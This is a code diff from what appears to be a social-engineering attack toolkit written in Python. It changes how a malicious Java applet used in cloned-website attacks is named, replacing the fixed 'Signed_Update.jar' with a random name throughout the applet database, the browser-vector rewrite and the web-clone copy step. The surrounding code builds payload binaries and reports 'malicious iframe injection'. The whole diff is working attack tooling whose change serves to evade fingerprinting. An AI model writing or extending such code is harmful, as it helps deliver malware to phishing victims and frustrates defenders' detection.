@@ -93,6 +93,10 @@ rand_gen_win = generate_random_string(6, 15)
 rand_gen_mac = generate_random_string(6, 15)
 # nix elf binary random name
 rand_gen_nix = generate_random_string(6, 15)
+# randomize name for java applet
+rand_gen_applet = generate_random_string(6, 15) + ".jar"
+# update the SET options
+update_options("APPLET_NAME=" + rand_gen_applet)
 
 try:
     ## open our config file that was specified in SET
@@ -246,6 +250,7 @@ try:
             applet_database = applet_database.replace("msf.exe", rand_gen_win)
             applet_database = applet_database.replace("mac.bin", rand_gen_mac)
             applet_database = applet_database.replace("nix.bin", rand_gen_nix)
+	    applet_database = applet_database.replace("RANDOMIZE1", rand_gen_applet)
             update_options("MSF.EXE=%s\nMAC.BIN=%s\nNIX.BIN=%s" % (rand_gen_win, rand_gen_mac, rand_gen_nix))
 
             ## close the file up
@@ -343,9 +348,9 @@ try:
             for line in fileopen:
                 counter=0
                 if attack_vector == "browser":
-                    match=re.search("Signed_Update.jar", line)
+                    match=re.search(rand_gen_applet, line)
                     if match:
-                        line=line.replace("Signed_Update.jar", "invalid.jar")
+                        line=line.replace(rand_gen_applet, "invalid.jar")
                         filewrite.write(line)
                         counter=1
 
@@ -369,8 +374,8 @@ try:
             print bcolors.BLUE + "[*] Malicious iframe injection successful...crafting payload.\n" + bcolors.ENDC
 
         if attack_vector == "java" or attack_vector == "browser" or attack_vector == "multiattack":
-            if not os.path.isfile(setdir + "/web_clone/Signed_Update.jar"):
-                shutil.copyfile("src/html/Signed_Update.jar.orig", setdir + "/web_clone/Signed_Update.jar")
+            if not os.path.isfile(setdir + "/web_clone/%s" % (rand_gen_applet)):
+                shutil.copyfile("src/html/Signed_Update.jar.orig", setdir + "/web_clone/%s" % (rand_gen_applet))
             ## move index.html to our main website
             if os.path.isfile(setdir + "/web_clone/index.html.new"):
                 shutil.move(setdir + "/web_clone/index.html.new", setdir + "/web_clone/index.html")
